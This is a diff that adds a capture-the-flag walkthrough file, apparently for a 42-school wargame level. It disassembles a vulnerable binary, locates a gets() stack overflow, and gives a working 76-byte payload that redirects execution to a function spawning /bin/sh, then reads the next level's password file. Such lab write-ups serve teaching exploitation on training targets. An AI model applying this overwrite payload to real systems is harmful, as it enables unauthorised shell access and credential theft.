@@ -1,0 +1,84 @@
+/* ************************************************************************** */
+/*                                                                            */
+/*                                                        :::      ::::::::   */
+/*   walkthrough                                        :+:      :+:    :+:   */
+/*                                                    +:+ +:+         +:+     */
+/*   By: ldedier <ldedier@student.42.fr>            +#+  +:+       +#+        */
+/*                                                +#+#+#+#+#+   +#+           */
+/*   Created: 2019/12/17 08:53:16 by ldedier           #+#    #+#             */
+/*   Updated: 2019/12/17 08:53:16 by ldedier          ###   ########.fr       */
+/*                                                                            */
+/* ************************************************************************** */
+
+we can see: 
+
+gdb-peda$ disass run
+
+   0x08048444 <+0>:	push   ebp
+   0x08048445 <+1>:	mov    ebp,esp
+   0x08048447 <+3>:	sub    esp,0x18
+   0x0804844a <+6>:	mov    eax,ds:0x80497c0
+   0x0804844f <+11>:	mov    edx,eax
+   0x08048451 <+13>:	mov    eax,0x8048570 ;  "Good... Wait what?\n"
+   0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
+   0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
+   0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
+   0x0804846a <+38>:	mov    DWORD PTR [esp],eax
+   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
+   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584 ;  "/bin/sh"
+   0x08048479 <+53>:	call   0x8048360 <system@plt>
+   0x0804847e <+58>:	leave
+   0x0804847f <+59>:	ret
+
+This function allow us to launch sh with level2 permissions
+
+gdb-peda$ disass main
+   0x08048480 <+0>:	push   ebp
+   0x08048481 <+1>:	mov    ebp,esp
+   0x08048483 <+3>:	and    esp,0xfffffff0
+   0x08048486 <+6>:	sub    esp,0x50
+   0x08048489 <+9>:	lea    eax,[esp+0x10]
+   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
+   0x08048490 <+16>:	call   0x8048340 <gets@plt>
+   0x08048495 <+21>:	leave
+   0x08048496 <+22>:	ret
+
+this call to gets can get the stack to overflow and modify the pointer to the next function to execute (for example function run)
+
+At entry point of main:
+
+State of the stack:
+
+0000| 0xbffff6c8 --> 0x0
+0004| 0xbffff6cc --> 0xb7e454d3 (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)
+
+-> we need to remplace the content of the address of 0xbffff6cc by the address of the run function so that the ' 0x08048496 <+22>: ret ' instruction indirectly calls run
+
+In order to do so, we need to input the right amount of chars followed by the right chars so it replaces by the appropriate values at the appropriate address.
+
+
+The goal address to jump to is : 0x08048444 <+0>: push   ebp
+We need to replace the content of 0xbffff6ec to 0x08048444
+
+operations since the push of the copy of the eip:
+
+we pushed ebp (+4)
+we aligned the stack (+8)
+we subbed esp (+80)
+we took the address of rsp + 16 (-16)
+
+80 + 8 + 4 - 16 = 76
+
+we need to replace the value of (char *)((the address of the buffer as input for gets) + 76) by 0x08048444
+
+to do so we do: 
+
+python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/ok
+
+cat /tmp/ok - | ./level1
+
+cat /home/user/level2/.pass
+
+Explanations: 
+
+The stack overflow replaced the address of libc_main by the address of run
